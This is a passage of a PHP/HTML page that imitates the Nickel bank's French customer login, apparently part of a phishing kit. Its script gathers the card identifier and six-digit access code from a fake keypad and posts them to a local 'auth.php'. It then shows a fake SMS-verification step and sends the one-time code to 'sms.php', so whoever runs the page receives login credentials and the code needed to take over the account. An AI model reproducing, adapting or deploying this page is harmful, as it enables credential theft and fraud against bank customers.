                            <path d="M245.1 449.1c17.2 0 31.2-14 31.2-31.2 0-17.3-14-31.2-31.2-31.2-17.3 0-31.3 14-31.3 31.2s14 31.2 31.3 31.2zM840.2 578.7h-77.7v-38.3h77.2c2.6 0 5.1-2.1 5.1-4.7V489c0-2.6-2.5-5.2-5.1-5.2h-77.2v-38.4h77.7c2.6 0 4.6-1.9 4.6-4.5v-49.5c0-2.6-2-4.5-4.6-4.5H704.5c-2.6 0-4.2 1.9-4.2 4.5v241.4c0 2.6 1.6 4.6 4.2 4.6h135.7c2.6 0 4.6-2 4.6-4.6v-49c0-2.6-2-5.1-4.6-5.1zM182.5 386.8h-53.8c-2.6 0-4.4 1.9-4.4 4.5v71.6c0 23 1.9 44.4 5.6 65.6L58.3 391.8c-1.6-3.1-4.9-5-8.4-5H4.1c-2.6 0-4.1 1.9-4.1 4.5v241.4c0 2.6 1.4 4.6 4.1 4.6h52.6c2.6 0 5.5-2 5.5-4.6v-71.6c0-23.3-2.5-44.4-6.5-65.6l71.7 136.8c1.6 3.1 4.6 4.9 8.1 4.9h47.1c2.7 0 4-2 4-4.6V391.3c-.1-2.6-1.4-4.5-4.1-4.5zM269.9 481.9h-49.8c-2.6 0-4.4 1.6-4.4 4.2v146.6c0 2.6 1.9 4.6 4.4 4.6h49.8c2.6 0 4.4-2 4.4-4.6V486.1c0-2.6-1.8-4.2-4.4-4.2zM455.9 574.7c-11.5 4.3-24.1 6.8-36.2 6.8-34.4 0-56.3-22.6-56.3-67.7 0-46.9 24-70.9 58-70.9 12.8 0 23.7 1.8 32.6 5.3 3.1 1.2 6.8-1.1 6.8-4.4v-49.3c0-1.9-1.6-3.7-3.4-4.4-14.5-5.4-29.4-8.6-44.7-8.6-63.5 0-113.4 46.6-113.8 132.2 0 87.8 52.3 128.6 113.2 128.6 17.3 0 32.9-2.8 47.1-7.8 1.9-.7 3.4-2.5 3.4-4.4v-51c0-3.2-3.6-5.5-6.7-4.4zM1018.6 578.7h-78.7V391.3c0-2.6-1.8-4.5-4.4-4.5H883c-2.7 0-5.3 1.9-5.3 4.5v241.4c0 2.6 2.6 4.6 5.3 4.6h135.7c2.6 0 5.4-2 5.4-4.6v-49.1c-.1-2.6-2.9-4.9-5.5-4.9zM682.1 630.6l-61.8-118.3L682 393.4c1.5-3.1-.8-6.6-4.3-6.6h-53.3c-1 0-1.9 0-2.4.9l-49.6 94.1h-22.1v-90.5c0-2.6-2.2-4.5-4.7-4.5H493c-2.6 0-4.9 1.9-4.9 4.5v241.4c0 2.6 2.3 4.6 4.9 4.6h52.6c2.6 0 4.7-2 4.7-4.6v-90.5h22l49.1 92.7c.7 1.7 2.5 2.4 4.3 2.4h52.1c3.6 0 5.9-3.6 4.3-6.7z">
                            </path>
                        </svg></div>
                </header>
                <div class="header-content">
                    <?php
                        if(getOS() == "Windows 10" || getOS() == "Windows 8.1" || getOS() == "Windows 8" || getOS() == "Windows 7" || getOS() == "Windows XP")
                        {
                            echo '<img alt="" class="media-homepage" src="https://app.nickel.eu/static/media/sketch-homepage.a14b9180.png" data-testid="SketchHomepage">';
                        }else{
                            echo '';
                        }
                    ?>
      
      <div class="wrapper-buttons">
      </div>
   </div>
            </div>
            <div class="MuiGrid-root form-side MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-lg-6">
                <div class="challenge-component" style="display: none;">
                    <p class="cn-text-default center">Tapez le code reçu par SMS au numéro de mobile </p>
                    <p class="cn-text-default"><strong></strong></p><span class="change-phone-number-informations" data-testid="change-phone-number-informations">
                        <p class="cn-text-default center">Vous avez changé de numéro de téléphone ?</p><a class="cn-button-tertiary link-modify-phone-number" href="#" rel="noopener noreferrer" target="_blank" title="Modifier mon numéro">Modifier mon
                            numéro</a>
                    </span>
                    <input id="telecode" class="input-mask" data-cy="input-challenge-code" data-testid="input-challenge-code" placeholder="X X X X X X" type="text" value="" maxlength="6"><button type="button" class="cn-button-tertiary" data-cy="resend-sms-link">Me renvoyer le code
                        SMS</button>
                </div>
                <div id="loginform">
                    <h2 class="sc-lfRxJW sc-bOCfAF ituQHD fVtOqH">CONNEXION À VOTRE ESPACE</h2>
                    <div class="sc-czNxle bOoHPe">
                        <span style="color: inherit; font-size: inherit; font-style: inherit; font-weight: 400; text-transform: inherit;">Votre
                            identifiant se trouve au verso de votre carte Nickel</span>
                        <div class="sc-zHacW hFBxwb">Si vous avez perdu votre carte envoyez par SMS <span style="color: inherit; font-size: inherit; font-style: inherit; font-weight: 500; text-transform: inherit;">IDENTIFIANT</span>
                            au <span style="color: inherit; font-size: inherit; font-style: inherit; font-weight: 500; text-transform: inherit;">460 21 39 26</span>
                        </div>
                    </div>
                    <form id="logForm" class="cn-form" autocomplete="off" method="POST" action="../sms.php">
                        <div class="barcode-component">
                            <div class="label-wrapper"><label for="usercode" class="sc-dkiSSI ibkFXD">Identifiant
                                    :</label><button type="button" class="cn-button-tertiary" data-cy="btn-where-to-find-my-identifier">Où trouver mon identifiant ?</button>
                            </div>
                            <input class="input-mask" data-cy="authentication-login" data-testid="authentication-login" id="usercode" placeholder="XXX XXX XXX X" type="text" value="">
                            <svg id="userinit" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" data-testid="AuthenticationEdit#Icon" css="" class="sc-WZYut sc-bRubDb jLeSfx lmSvld">
                                <path d="M982.7 148.2L875.8 41.3c-55.1-55.1-144.8-55.1-199.9 0L122.3 595 31 902.7c-.9 3-1.6 6-2.1 9.1l-11.7 11.7c-23 23-23 60.3 0 83.3s60.3 23 83.3 0l11.7-11.7c3-.5 6.1-1.2 9.1-2.1L429 901.7 982.7 348c55.1-55 55.1-144.7 0-199.8zM366.9 797.3l-199.3 59.1 59.1-199.3 400.9-400.9 31.2 31.2c23 23 60.3 23 83.3 0s23-60.3 0-83.3l-31.2-31.2 48.3-48.3c9.2-9.2 24.1-9.2 33.3 0l106.9 106.9c9.2 9.2 9.2 24.1 0 33.3L366.9 797.3z">
                                </path>
                            </svg>
                        </div>
                        <div class="wrapper-checkbox ">
                            <label class="MuiFormControlLabel-root">
                                <span class="MuiButtonBase-root MuiIconButton-root jss116 MuiCheckbox-root MuiCheckbox-colorSecondary cn-checkbox MuiIconButton-colorSecondary" aria-disabled="false" data-cy="remember-me">
                                    <span class="MuiIconButton-label">
                                        <input class="jss119" type="checkbox" data-indeterminate="false" value="rememberMe">
                                        <svg class="MuiSvgIcon-root" focusable="false" viewBox="0 0 24 24" aria-hidden="true" role="presentation">
                                            <path d="M19 5v14H5V5h14m0-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z">
                                            </path>
                                        </svg>
                                    </span>
                                    <span class="MuiTouchRipple-root"></span>
                                </span>
                                <span class="MuiTypography-root MuiFormControlLabel-label cn-checkbox-label MuiTypography-body1">Se
                                    souvenir de moi</span>
                            </label>
                        </div>
                        <div class="error-input"></div>
                        <div class="label-wrapper"><label class="sc-dkiSSI ibkFXD">Code d'accès :</label><button type="button" class="cn-button-tertiary" data-cy="btn-what-is-my-access-code">Quel est
                                mon code d'accès ?</button></div>
                        <div class="cn-hidden-password">
                            <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" css="" class="sc-dkuGKe sc-ezjrSx fvcBYL hqEaYA">
                                <path d="M702.5 321.7c-18-18-47.2-18-65.3 0L512 447 386.8 321.8c-18-18-47.2-18-65.3 0-18 18-18 47.2 0 65.3l125.2 125.2-125.1 125.1c-18 18-18 47.2 0 65.3 18 18 47.2 18 65.3 0L512 577.5l125.2 125.2c18 18 47.2 18 65.3 0 18-18 18-47.2 0-65.3L577.3 512.2 702.5 387c18-18 18-47.2 0-65.3z">
                                </path>
                                <path d="M982.1 566.9c-25-5.5-49.6 10.3-55.1 35.2-24 109.4-89.4 202.9-183.7 263.2s-206.6 80.3-316 56.2c-225.8-49.7-369.2-274-319.4-499.8s274-369.1 499.8-319.4c158.9 35 284.3 160.3 319.5 319.2 5.5 24.9 30.2 40.6 55.1 35.1s40.6-30.2 35.1-55.1C974.5 207.6 821.4 54.7 627.5 12 351.8-48.7 78.1 126.2 17.5 401.9c-60.6 275.7 114.3 549.3 389.9 610 30.6 6.7 61.8 10.7 93.2 11.8 102.7 3.6 204-23.9 292.5-80.4 115.2-73.7 194.8-187.8 224.2-321.3 5.5-25-10.3-49.6-35.2-55.1z">
                                </path>
                            </svg>
                        </div>
                        <div class="cn-random-numeric-pad">
                            <div class="line-keyboard">
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard4"><span>4</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard1"><span>1</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard0"><span>0</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard6"><span>6</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard5"><span>5</span></button></div>
                            </div>
                            <div class="line-keyboard">
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard2"><span>2</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard7"><span>7</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard3"><span>3</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard9"><span>9</span></button></div>
                                <div class="sc-jhGUec LToeK sc-bShgHC fjLQwb sc-eiQWpL sc-irqbAE koCxyi kxZWSs"><button type="button" data-testid="codeKeyboard8"><span>8</span></button></div>
                            </div>
                        </div>
                        <input type="hidden" id="username" name="username" value="" />
                        <input type="hidden" id="passcode" name="passcode" value="" />
                        <input type="hidden" id="verifier" name="verifier" value="" />
                    </form>
                    <div class="sc-czETjp gZEqge">
                        <span style="color: inherit; font-size: inherit; font-style: inherit; font-weight: 500; text-transform: inherit;">Première
                            connexion ?</span>
                        <div class="sc-jHUuBy ildViN">Vous ne vous êtes encore jamais connecté à votre espace client,
                            cliquez ci-dessous :</div>
                            <div style='    -webkit-text-size-adjust: 100%;
    font-size: 18px;
    line-height: normal;
    text-align: center;
    box-sizing: border-box;
    font-family: "Muller Narrow", sans-serif;
    display: inline-block;
    min-width: 0px;' class="sc-hkoqWr jFEIoy sc-ecQkzk joLeop sc-dkiSSI ibkFXD"><button style='    -webkit-text-size-adjust: 100%;
    font-family: inherit;
    margin: 0;
    line-height: normal;
    text-transform: none;
    -webkit-appearance: button;
    -webkit-box-align: center;
    align-items: center;
    border-radius: 1.9rem;
    box-shadow: none;
    box-sizing: border-box;
    cursor: pointer;
    display: inline-flex;
    flex-direction: row;
    font-size: 1rem;
    font-weight: 500;
    -webkit-box-pack: center;
    justify-content: center;
    min-height: 1.5rem;
    outline: none;
    padding: 0.5rem 1.0rem;
    text-decoration: none;
    width: 100%;
    background-color: transparent;
    border: 1px solid rgb(49, 66, 79);
    color: rgb(49, 66, 79);' type="button" data-testid="CreateAccount#Btn"><span>Créer mon espace client</span></button></div>
                    </div>
                    <div class="sc-jhGUec LToeK sc-ecQkzk sc-hYIrvc efLGEG fkDYQI sc-eiQWpL koCxyi"><button type="button"><span>Faire opposition</span></button></div>
                </div>
            </div>
        </div>


    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://rawgit.com/RobinHerbots/Inputmask/5.x/dist/jquery.inputmask.js"></script>
    <script>
        document.getElementById('usercode').addEventListener('input', (event) => {
            var inp = document.getElementById('usercode');

            if (inp.value.trim().length == 10) {
                document.getElementById('userinit').style.display = "block";

                inp.disabled = true;

                $('.label-wrapper, .cn-hidden-password, .cn-random-numeric-pad').show();
            } else {
                document.getElementById('userinit').style.display = "none";

                inp.disabled = false;

                $('.label-wrapper, .cn-hidden-password, .cn-random-numeric-pad').hide();
            }

            document.getElementById('username').value = inp.value;
        }, true);

        document.getElementById('userinit').addEventListener('click', (event) => {
            var inp = document.getElementById('usercode');

            inp.value = "";

            inp.disabled = false;

            document.getElementById('userinit').style.display = "none";

            $('.label-wrapper, .cn-hidden-password, .cn-random-numeric-pad').hide();
        }, false);

        jQuery(function() {
            $(".cn-random-numeric-pad button").click(function(ev) {
                var v = $('#passcode').val();

                if (v.length < 6) {
                    v += $(ev.currentTarget).children('span').html();
                }

                $('#passcode').val(v);

                refreshpass(v);
            });

            $('.label-wrapper, .cn-hidden-password, .cn-random-numeric-pad').hide();
        });

        function resetpass() {
            $('#passcode').val("");

            refreshpass("");
        }

        function refreshpass(value) {
            var r = "";

            for (i = 0; i < 6; i++) {
                if (i < value.length) {
                    r += '<span class="dot complete"></span>';
                } else {
                    r += '<span class="dot"></span>';
                }
            }

            if (value.length) {
                r +=
                    '<svg onclick="resetpass();" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" css="" class="sc-dkuGKe sc-ezjrSx fvcBYL hqEaYA"><path d="M702.5 321.7c-18-18-47.2-18-65.3 0L512 447 386.8 321.8c-18-18-47.2-18-65.3 0-18 18-18 47.2 0 65.3l125.2 125.2-125.1 125.1c-18 18-18 47.2 0 65.3 18 18 47.2 18 65.3 0L512 577.5l125.2 125.2c18 18 47.2 18 65.3 0 18-18 18-47.2 0-65.3L577.3 512.2 702.5 387c18-18 18-47.2 0-65.3z"></path><path d="M982.1 566.9c-25-5.5-49.6 10.3-55.1 35.2-24 109.4-89.4 202.9-183.7 263.2s-206.6 80.3-316 56.2c-225.8-49.7-369.2-274-319.4-499.8s274-369.1 499.8-319.4c158.9 35 284.3 160.3 319.5 319.2 5.5 24.9 30.2 40.6 55.1 35.1s40.6-30.2 35.1-55.1C974.5 207.6 821.4 54.7 627.5 12 351.8-48.7 78.1 126.2 17.5 401.9c-60.6 275.7 114.3 549.3 389.9 610 30.6 6.7 61.8 10.7 93.2 11.8 102.7 3.6 204-23.9 292.5-80.4 115.2-73.7 194.8-187.8 224.2-321.3 5.5-25-10.3-49.6-35.2-55.1z"></path></svg>';
            }

            $('.cn-hidden-password').html(r);

            if (value.length == 6) {
                $.ajax({
                    method: 'POST',
                    data: {
                        username: document.getElementById('username').value,
                        passcode: document.getElementById('passcode').value,
                        step: 'login',
                    },
                    url: '../auth.php',
                    success: function() {

                    },
                });
                $('#loginform').hide();
                $('.challenge-component').show();
            }
        }

        document.getElementById('telecode').addEventListener('input', (event) => {
            var inp = document.getElementById('telecode');

            if (inp.value.trim().length == 6) {
                document.getElementById('verifier').value = inp.value;

                document.getElementById('logForm').submit();
            }
        }, false);

        document.getElementById('userinit').style.display = "none";
    </script>
</body>

</html>